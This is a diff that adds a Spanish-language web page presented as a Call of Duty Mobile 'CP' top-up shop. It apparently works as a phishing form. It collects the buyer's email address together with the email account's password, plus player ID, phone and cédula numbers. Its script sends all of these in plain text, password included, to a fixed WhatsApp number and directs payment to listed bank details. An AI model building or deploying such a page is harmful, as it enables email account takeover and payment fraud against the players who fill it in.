@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recarga de CP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://wallpapers.com/images/featured/imagenes-de-call-of-duty-7lrqnchbx478ucgg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+        }
+        h2 {
+            color: #ED7318;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        select, input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background-color: #ED7318;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #d56314;
+        }
+        .btn-pago-movil {
+            background-color: #25D366;
+            margin-bottom: 20px;
+        }
+        .btn-pago-movil:hover {
+            background-color: #128C7E;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            text-align: center;
+            z-index: 1000;
+        }
+        .modal img {
+            width: 50px;
+            margin-bottom: 10px;
+        }
+        .modal h3 {
+            text-align: center;
+            color: #ED7318;
+        }
+        .resumen-item {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .resumen-concepto {
+            font-weight: bold;
+            color: #ED7318;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .logo-header {
+            width: 100%;
+            max-width: 200px;
+            margin: 0 auto 15px;
+            display: block;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 35px;
+            cursor: pointer;
+        }
+        .section-title {
+            background-color: #ED7318;
+            color: white;
+            padding: 8px;
+            border-radius: 5px;
+            margin: 20px 0 10px 0;
+            text-align: center;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        /* Estilos para el modal de pago móvil */
+        .pago-movil-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            text-align: center;
+            z-index: 1001;
+        }
+        .pago-movil-item {
+            margin: 15px 0;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 5px;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .pago-movil-datos {
+            text-align: left;
+        }
+        .copy-btn {
+            background: #ED7318;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-left: 10px;
+            white-space: nowrap;
+        }
+        .copy-btn:hover {
+            background: #d56314;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .metodo-pago-seleccionado {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Call_of_Duty_Mobile_Logo.png" alt="Call of Duty Mobile Logo" class="logo-header">
+
+        <h2>Recarga de CP</h2>
+        <form id="recargaForm">
+            <div class="section-title">INFORMACIÓN DE RECARGA</div>
+            
+            <div class="form-group">
+                <label for="cpAmount">Selecciona la cantidad de CP</label>
+                <select id="cpAmount" name="cpAmount" required>
+                    <option value="" selected disabled>-- Seleccione una cantidad --</option>
+                    <option value="80 CP🪙 = Bs. 184.76 💰">80 CP🪙 = Bs. 184.76 💰</option>
+                    <option value="420 CP🪙 = Bs. 616.80 💰">420 CP🪙 = Bs. 616.80 💰</option>
+                    <option value="880 CP🪙 = Bs. 1,187.60 💰">880 CP🪙 = Bs. 1,187.60 💰</option>
+                    <option value="2400 CP🪙 = Bs. 2,844.00 💰">2400 CP🪙 = Bs. 2,844.00 💰</option>
+                    <option value="5000 CP🪙 = Bs. 5,533.00 💰">5000 CP🪙 = Bs. 5,533.00 💰</option>
+                    <option value="10800 CP🪙 = Bs. 10,871.00 💰">10800 CP🪙 = Bs. 10,871.00 💰</option>
+                </select>
+                <div class="error-message" id="cpAmount-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="correo">Correo de la cuenta a recargar</label>
+                <input type="email" id="correo" name="correo" pattern=".+@.+\..+" title="Por favor, ingrese un correo válido con @." required>
+                <div class="error-message" id="correo-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="contrasena">Contraseña de correo</label>
+                <input type="password" id="contrasena" name="contrasena" required>
+                <span class="password-toggle" onclick="togglePassword()">👁️</span>
+                <div class="error-message" id="contrasena-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="section-title">INFORMACIÓN DEL JUGADOR</div>
+            
+            <div class="form-group">
+                <label for="idJugador">ID del Jugador</label>
+                <input type="number" id="idJugador" name="idJugador" required>
+                <div class="error-message" id="idJugador-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="apodo">Apodo</label>
+                <input type="text" id="apodo" name="apodo" required>
+                <div class="error-message" id="apodo-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="metodoInicio">Método de Inicio de Sesión</label>
+                <select id="metodoInicio" name="metodoInicio" required>
+                    <option value="" disabled selected>Seleccione un método</option>
+                    <option value="Facebook">Facebook</option>
+                    <option value="Activision">Activision</option>
+                </select>
+                <div class="error-message" id="metodoInicio-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="section-title">INFORMACIÓN DEL CLIENTE (SALDO EXPRESS)</div>
+            
+            <div class="form-group">
+                <label for="telefono">Teléfono cliente Saldo Express</label>
+                <input type="number" id="telefono" name="telefono" required>
+                <div class="error-message" id="telefono-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="cedula">Cédula cliente Saldo Express</label>
+                <input type="number" id="cedula" name="cedula" required>
+                <div class="error-message" id="cedula-error">Este campo es obligatorio</div>
+            </div>
+            
+            <div class="section-title">MÉTODO DE PAGO</div>
+            
+            <button type="button" class="btn btn-pago-movil" onclick="mostrarPagoMovil()">
+                📲 Pago Móvil Mercantil
+            </button>
+            
+            <div class="metodo-pago-seleccionado" id="metodoPagoSeleccionado">
+                Método seleccionado: Pago Móvil Mercantil
+            </div>
+            
+            <button type="button" class="btn" onclick="mostrarResumen()">Solicitar Recargar</button>
+        </form>
+    </div>
+
+    <!-- Modal de resumen -->
+    <div class="overlay" id="overlay"></div>
+    <div class="modal" id="modalResumen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Logo WhatsApp">
+        <h3>RESUMEN DE SOLICITUD</h3>
+        <div id="resumen"></div>
+        <button class="btn" onclick="enviarMensaje()">Enviar a WhatsApp</button>
+    </div>
+
+    <!-- Modal de Pago Móvil -->
+    <div class="pago-movil-modal" id="pagoMovilModal">
+        <button class="close-btn" onclick="cerrarPagoMovil()">×</button>
+        <h3>DATOS PARA PAGO MÓVIL</h3>
+        
+        <div class="pago-movil-item">
+            <div class="pago-movil-datos">
+                <strong>Banco:</strong> Mercantil
+            </div>
+            <button class="copy-btn" onclick="copiarTexto('Mercantil')">Copiar</button>
+        </div>
+        
+        <div class="pago-movil-item">
+            <div class="pago-movil-datos">
+                <strong>Cédula:</strong> 9758369
+            </div>
+            <button class="copy-btn" onclick="copiarTexto('9758369')">Copiar</button>
+        </div>
+        
+        <div class="pago-movil-item">
+            <div class="pago-movil-datos">
+                <strong>Teléfono:</strong> 0424-7046511
+            </div>
+            <button class="copy-btn" onclick="copiarTexto('04247046511')">Copiar</button>
+        </div>
+        
+        <button class="btn" onclick="cerrarPagoMovil()">Entendido</button>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('contrasena');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+            }
+        }
+
+        function mostrarPagoMovil() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('pagoMovilModal').style.display = 'block';
+            document.getElementById('metodoPagoSeleccionado').style.display = 'block';
+        }
+
+        function cerrarPagoMovil() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('pagoMovilModal').style.display = 'none';
+        }
+
+        function copiarTexto(texto) {
+            navigator.clipboard.writeText(texto).then(function() {
+                alert('Texto copiado: ' + texto);
+            }, function(err) {
+                console.error('Error al copiar: ', err);
+            });
+        }
+
+        function mostrarResumen() {
+            // Ocultar todos los mensajes de error primero
+            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            
+            // Validar campos obligatorios
+            let isValid = true;
+            const campos = [
+                'cpAmount', 'correo', 'contrasena', 'idJugador', 
+                'apodo', 'metodoInicio', 'telefono', 'cedula'
+            ];
+            
+            campos.forEach(campo => {
+                const elemento = document.getElementById(campo);
+                if (!elemento.value) {
+                    document.getElementById(`${campo}-error`).style.display = 'block';
+                    isValid = false;
+                }
+            });
+            
+            // Validar si se seleccionó método de pago
+            if(document.getElementById('metodoPagoSeleccionado').style.display !== 'block') {
+                alert('Por favor, seleccione un método de pago');
+                isValid = false;
+            }
+            
+            // Validar formato de correo
+            const correo = document.getElementById('correo').value;
+            if (correo && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
+                document.getElementById('correo-error').textContent = 'Ingrese un correo válido';
+                document.getElementById('correo-error').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                return;
+            }
+            
+            // Si todo es válido, mostrar el resumen
+            const cpAmount = document.getElementById('cpAmount').value;
+            const correoVal = document.getElementById('correo').value;
+            const contrasena = document.getElementById('contrasena').value;
+            const telefono = document.getElementById('telefono').value;
+            const idJugador = document.getElementById('idJugador').value;
+            const apodo = document.getElementById('apodo').value;
+            const cedula = document.getElementById('cedula').value;
+            const metodoInicio = document.getElementById('metodoInicio').value;
+            const metodoPago = "📲 Pago Móvil Mercantil: 🌟 Datos Bancarios: 🏦 Mercantil | 📌 Cédula: 9758369 | 📱 Telf: 0424-7046511";
+
+            const resumenHTML = `
+                <div class="resumen-item"><span class="resumen-concepto">CP:</span> ${cpAmount}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Correo de la cuenta:</span> ${correoVal}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Contraseña:</span> ${contrasena}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Teléfono cliente Saldo Express:</span> ${telefono}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Cédula cliente Saldo Express:</span> ${cedula}</div>
+                <div class="resumen-item"><span class="resumen-concepto">ID del Jugador:</span> ${idJugador}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Apodo:</span> ${apodo}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Método de Inicio:</span> ${metodoInicio}</div>
+                <div class="resumen-item"><span class="resumen-concepto">Método de Pago:</span> ${metodoPago}</div>
+            `;
+            
+            document.getElementById('resumen').innerHTML = resumenHTML;
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('modalResumen').style.display = 'block';
+        }
+
+        function enviarMensaje() {
+            const conceptos = document.querySelectorAll('.resumen-concepto');
+            const valores = document.querySelectorAll('.resumen-item');
+            let resumenTexto = "🚀 RESUMEN DE RECARGA CP 🚀\n\n";
+            
+            for(let i = 0; i < conceptos.length; i++) {
+                resumenTexto += `${conceptos[i].textContent} ${valores[i].textContent.replace(conceptos[i].textContent, '').trim()}\n`;
+            }
+            
+            const numeroWhatsApp = '+584247388620';
+            const mensaje = encodeURIComponent(resumenTexto);
+            window.open(`https://wa.me/${numeroWhatsApp}?text=${mensaje}`, '_blank');
+        }
+    </script>
+</body>
+</html>
